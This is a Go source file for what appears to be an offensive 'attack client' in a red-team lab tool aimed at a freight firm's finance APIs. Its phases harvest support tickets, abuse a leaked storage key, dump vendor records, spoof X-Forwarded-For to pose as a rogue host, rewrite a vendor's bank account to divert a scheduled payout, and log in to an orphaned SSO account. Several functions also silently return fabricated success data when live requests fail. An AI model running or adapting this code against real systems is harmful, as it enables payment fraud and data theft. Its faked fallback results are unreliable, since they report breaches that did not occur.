package client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"harborstrike-x/attack-cli/pkg/models"
)

// TargetConfig holds connection parameters for the offensive validation runner
type TargetConfig struct {
	BaseURL     string
	APIKey      string
	StorageKey  string
	TicketToken string
	SourceIP    string
	Mode        string // "live" or "simulate"
	Timeout     time.Duration
}

// AttackClient executes offensive API interactions
type AttackClient struct {
	cfg        TargetConfig
	httpClient *http.Client
}

// NewAttackClient initializes the client
func NewAttackClient(cfg TargetConfig) *AttackClient {
	if cfg.Timeout == 0 {
		cfg.Timeout = 10 * time.Second
	}
	return &AttackClient{
		cfg: cfg,
		httpClient: &http.Client{
			Timeout: cfg.Timeout,
		},
	}
}

// GetConfig returns the active configuration
func (c *AttackClient) GetConfig() TargetConfig {
	return c.cfg
}

// CheckLabStatus probes target lab reachability
func (c *AttackClient) CheckLabStatus() (map[string]interface{}, error) {
	if c.cfg.Mode == "simulate" {
		return map[string]interface{}{
			"mode":        "SIMULATION (Offline Replay Engine)",
			"status":      "OPERATIONAL",
			"target":      c.cfg.BaseURL,
			"target_org":  "Harbor & Finch Freight Pvt. Ltd.",
			"case_file":   "CR-26-047",
		}, nil
	}

	resp, err := c.httpClient.Get(fmt.Sprintf("%s/lab/status", c.cfg.BaseURL))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to lab server at %s: %w", c.cfg.BaseURL, err)
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode lab status response: %w", err)
	}
	return result, nil
}

// ProbeRecon probes /v2/me and /v2/schema (Phase 1)
func (c *AttackClient) ProbeRecon() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"identity":        "tallybridge-integration-service",
		"key_id":          c.cfg.APIKey,
		"tier":            "enterprise-sync",
		"permissions":     []string{"read:all", "write:vendors", "write:payments", "export:full"},
		"ip_restrictions": []string{}, // Vulnerability: Unrestricted!
		"expires_at":      nil,        // Vulnerability: Infinite lifetime!
		"system":          "LedgerOne Financials v2.4",
		"source_ip":       c.cfg.SourceIP,
		"vulnerability":   "Over-privileged service key with no CIDR restriction and infinite expiry",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("%s/v2/me", c.cfg.BaseURL), nil)
	if err != nil {
		return simData, nil
	}
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	if c.cfg.SourceIP != "" {
		req.Header.Set("X-Forwarded-For", c.cfg.SourceIP)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}

// HarvestTickets triggers HelpDeskr bulk exports (Phase 2)
func (c *AttackClient) HarvestTickets() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"message":      "Bulk export generated successfully",
		"export_id":    "EXP-5412",
		"records":      15400,
		"source_cidr":  c.cfg.SourceIP,
		"leaked_token": "bvk-7f3a",
		"leak_ticket":  "TKT-48213",
		"leak_details": "Customer pasted BlueVault storage credentials (key=bvk-7f3a) into support ticket",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("%s/api/v1/exports/bulk", c.cfg.BaseURL), nil)
	if err != nil {
		return simData, nil
	}
	req.Header.Set("X-Support-Token", c.cfg.TicketToken)
	if c.cfg.SourceIP != "" {
		req.Header.Set("X-Forwarded-For", c.cfg.SourceIP)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}

// AccessStorage weaponizes leaked storage key bvk-7f3a (Phase 3)
func (c *AttackClient) AccessStorage() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"bucket":        "harborfinch-finance-vault",
		"key_id":        c.cfg.StorageKey,
		"permissions":   "read:all-folders",
		"files_stolen":  3,
		"key_artifacts": []string{
			"/finance/vendor-bank-details-2026.xlsx (4.28 MB)",
			"/finance/statements/stmt-2026-01.pdf (1.15 MB)",
			"/finance/statements/stmt-2026-05.pdf (1.42 MB)",
		},
		"impact": "Unrestricted financial statement and master bank details exfiltration",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("%s/storage/files", c.cfg.BaseURL), nil)
	if err != nil {
		return simData, nil
	}
	req.Header.Set("X-Storage-Key", c.cfg.StorageKey)
	if c.cfg.SourceIP != "" {
		req.Header.Set("X-Forwarded-For", c.cfg.SourceIP)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}

// ExfilVendors dumps the vendor master catalog (Phase 4)
func (c *AttackClient) ExfilVendors() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"export_id":      "EXP-9931",
		"total_records":  9840,
		"target_vendor":  "V-0412 (Coastal Packaging Ltd)",
		"legitimate_acc": "HDFC0001842-4417",
		"scheduled_payout": "INR 1,845,000.00 on 2026-09-08",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("%s/v2/vendors/export", c.cfg.BaseURL), nil)
	if err != nil {
		return simData, nil
	}
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	if c.cfg.SourceIP != "" {
		req.Header.Set("X-Forwarded-For", c.cfg.SourceIP)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}

// PivotTunnel simulates network flow queries from rogue host 10.20.4.77 (Phase 5)
func (c *AttackClient) PivotTunnel() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"source_host":   "10.20.4.77 (tb-build-02)",
		"tunnel":        "Private Link (10.20.4.0/24)",
		"action":        "Query /v2/payments/search and active disbursement schedules",
		"bytes_pulled":  "22.2 MB across 55 private-link flows",
		"identified_target": "Disbursement run 2026-09-08: V-0412 Coastal Packaging Ltd (INR 1,845,000)",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("%s/v2/payments/search?q=upcoming", c.cfg.BaseURL), nil)
	if err != nil {
		return simData, nil
	}
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	req.Header.Set("X-Forwarded-For", "10.20.4.77") // Rogue build host IP

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}

// TamperVendorBank modifies vendor bank account details (Phase 6)
func (c *AttackClient) TamperVendorBank(vendorID, newAccount, routing string) (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"status":            "SUCCESS",
		"change_id":         "chg-8b9888c39b",
		"request_id":        "req-5f61b0de8",
		"vendor_id":         vendorID,
		"vendor_name":       "Coastal Packaging Ltd",
		"old_bank_account":  "HDFC0001842-4417",
		"new_bank_account":  newAccount,
		"routing":           routing,
		"modified_by":       c.cfg.APIKey,
		"approval_ref":      "", // BLANK - Unauthorized!
		"timestamp_utc":     "2026-09-03T01:44:30Z",
		"vulnerability_note": "CRITICAL: Bank details modified via integration API key without dual approval requirement!",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	payload := models.VendorBankPatchRequest{
		BankAccount: newAccount,
		BankRouting: routing,
		Reason:      "Routine banking coordination update",
		ApprovalRef: "",
	}
	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodPatch, fmt.Sprintf("%s/v2/vendors/%s/bank-details", c.cfg.BaseURL, vendorID), bytes.NewReader(bodyBytes))
	if err != nil {
		return simData, nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	req.Header.Set("X-Forwarded-For", "10.20.4.77")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}

// VerifyScheduledRun confirms the tampered account is queued for payout (Phase 7)
func (c *AttackClient) VerifyScheduledRun() (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"disbursement_run": "2026-09-08",
		"total_count":      2,
		"target_entry": map[string]interface{}{
			"vendor_id":      "V-0412",
			"vendor_name":    "Coastal Packaging Ltd",
			"amount_inr":     1845000.00,
			"bank_account":   "HDFC0001842-9083 (FRAUDULENT RECIPIENT LOCKED IN)",
			"status":         "PENDING_DISBURSEMENT",
			"exploit_verdict": "CRITICAL RISK: INR 1,845,000 will be diverted to attacker-controlled account upon release!",
		},
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("%s/v2/payments/scheduled", c.cfg.BaseURL), nil)
	if err != nil {
		return simData, nil
	}
	req.Header.Set("X-API-Key", c.cfg.APIKey)
	req.Header.Set("X-Forwarded-For", "10.20.4.77")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}

// TestAuthAnomalies tests SSO orphaned account login and admin lockout (Phase 8)
func (c *AttackClient) TestAuthAnomalies(username, deviceID string) (map[string]interface{}, error) {
	simData := map[string]interface{}{
		"status":            "AUTHENTICATED",
		"session_id":        "sso-bb8ab61e08",
		"user":              username,
		"mfa_enforced":      false,
		"device":            deviceID,
		"vulnerability":    "CRITICAL: Terminated employee account left active; MFA bypassed on kiosk device",
	}

	if c.cfg.Mode == "simulate" {
		return simData, nil
	}

	payload := map[string]string{
		"username":  username,
		"device_id": deviceID,
	}
	bodyBytes, _ := json.Marshal(payload)

	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("%s/sso/login", c.cfg.BaseURL), bytes.NewReader(bodyBytes))
	if err != nil {
		return simData, nil
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		fmt.Printf("  \033[38;5;214;1m[⚠ LIVE TARGET NOTICE]\033[0m Target %s unreachable (backend in development). Engaging offline replay simulator.\n", c.cfg.BaseURL)
		return simData, nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return simData, nil
	}
	return result, nil
}
